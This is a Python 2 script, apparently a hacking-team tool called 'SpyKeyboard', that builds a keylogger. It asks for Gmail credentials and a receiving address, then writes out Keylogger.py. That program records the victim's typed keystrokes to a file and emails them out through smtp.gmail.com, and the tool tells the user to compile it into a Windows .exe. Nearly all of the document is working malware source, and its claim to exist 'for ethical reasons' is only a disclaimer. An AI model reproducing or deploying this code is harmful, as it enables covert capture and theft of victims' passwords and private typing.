#!/usr/bin/env python
import io, os

def generate(usuario, password, email1):
    with io.FileIO('Keylogger.py', 'w') as (file):
        file.write('\n#!/bin/usr/python\n# -*- coding: utf-8 -*-\n\nimport threading\nimport os\nimport keyboard\nimport smtplib\nfrom time import sleep\n\n\n\n \ndef keylogger():\n\n    FILE_NAME = "keys.txt"\n    CLEAR_ON_STARTUP = False\n    TERMINATE_KEY = "enter"\n\n    if CLEAR_ON_STARTUP:\n        os.remove(FILE_NAME)\n    \n    output = open(FILE_NAME, "a")\n    \n    for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_KEY)):\n        output.write(string)\n    \n    output.close()\n\ndef sendmail():\n\n     \n\n   \n\n    gmail_user = "' + usuario + '"\n    gmail_password = "' + password + '"\n    FROM =gmail_user\n    TO = "' + email1 + '"\n    SUBJECT= "key" \n\n        \n    sleep(7.0)\n    try:\n        F = open("keys.txt","r")\n\n        TEXT= F.read()\n        message = """\\From: %s\nTo: %s\nSubject: %s\n\n%s\n        """ % (FROM, ", ".join(TO), SUBJECT, TEXT)\n    except:\n        print "error"\n\n    try: \n        server =smtplib.SMTP("smtp.gmail.com", 587)\n        server.ehlo()\n        server.starttls()\n        server.login(gmail_user,gmail_password)\n        server.sendmail(FROM, TO, message)\n        server.close()\n        print "eviado"\n    except:\n        print "error"\n\n\nos.system("nano keys.txt")\n\nwhile True:\n \n    if __name__ == "__main__":\n        \n        key = threading.Thread(target=keylogger)\n        mail = threading.Thread(target=sendmail)\n\n \n        key.start()\n        mail.start()\n \n        key.join()\n        mail.join()\n \n')


class bcolors:
    BLUE = '\x1b[94m'
    GREEN = '\x1b[92m'
    RED = '\x1b[31m'
    YELLOW = '\x1b[93m'
    ENDC = '\x1b[0m'
    BOLD = '\x1b[1m'
    BGRED = '\x1b[41m'


print '\x1b[31m'
os.system('figlet -f future SpyKeyboard')
print '\n\x1b[31m[+]\x1b[37mAuthor : GunadiCBR & AfelzCBR\n\x1b[31m[+]\x1b[37mDate   : 20-10-2018\n\x1b[31m[+]\x1b[37mGithub : https://github.com/afelfgie\n\x1b[31m[+]\x1b[37mTeam   : Mls18hckr & hackerabalabal'
print ' '
print '\x1b[31;1m[+] \x1b[37;1mThis tool was created for ethical reasons, I am not responsible for misuse.'
usuario = raw_input('\x1b[31;1mEnter your email :\x1b[37m ')
password = raw_input('\x1b[31;1mEnter your password :\x1b[37m ')
email1 = raw_input('\x1b[31;1mEnter your email receive :\x1b[37m ')
print ' '
print '\x1b[31;1m[+] \x1b[37;1mYour keylogger is ready, compile it to .exe in a Windows machine'
print '\x1b[31m[+] \x1b[37mThanks For Using My Tool...:V'
generate(usuario, password, email1)
